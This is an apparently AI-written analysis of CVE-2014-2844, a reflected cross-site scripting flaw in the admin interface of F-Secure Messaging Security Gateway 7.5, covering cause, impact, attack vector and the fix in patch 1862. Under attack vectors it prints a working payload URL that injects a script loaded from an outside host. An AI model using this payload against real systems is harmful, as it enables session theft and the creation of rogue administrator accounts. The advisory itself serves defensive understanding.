Based on the provided information, here's an analysis of CVE-2014-2844:

**Root cause of vulnerability:**

*   The vulnerability is due to a lack of proper input validation of the "NEW" parameter in the `/admin?module=SysUser&method=user&new=` page of the F-Secure Messaging Security Gateway.

**Weaknesses/vulnerabilities present:**

*   **Reflected Cross-Site Scripting (XSS):** The application fails to sanitize user-supplied input, allowing an attacker to inject malicious scripts into the web page.

**Impact of exploitation:**

*   **Arbitrary HTML/script execution:** An attacker can execute arbitrary HTML or JavaScript code in a victim's browser within the context of the vulnerable application.
*   **Privilege escalation:** The attacker can potentially create new administrator accounts.

**Attack vectors:**

*   **Malicious URL:** An attacker crafts a malicious URL containing the XSS payload in the "NEW" parameter and tricks a user into accessing it (e.g. via phishing).
*   The vulnerable URL is: `https://IP_FSecure:10000/admin?module=SysUser&method=user&new=1><script src=//10.0.1.120/f-secure/e.js`

**Required attacker capabilities/position:**

*   The attacker needs to craft a malicious URL with the XSS payload.
*   The attacker needs to persuade the victim to click on the URL while logged into the F-Secure Messaging Security Gateway application.

**Additional details:**

*   The vulnerability was discovered in F-Secure Messaging Security Gateway V7.5.0.892.
*   The fix involves proper validation of user-supplied data, and it was addressed in patch 1862.
*   The provided proof of concept shows an injected script that executes `alert("F-Secure XSS")` demonstrating the XSS vulnerability.

**Summary:**
This is a reflected XSS vulnerability in F-Secure Messaging Security Gateway caused by the lack of input validation of the "NEW" parameter. By crafting a malicious URL an attacker can execute arbitrary HTML or script code in a targeted user's browser, potentially creating new administrator accounts. The vulnerability was fixed in patch 1862.
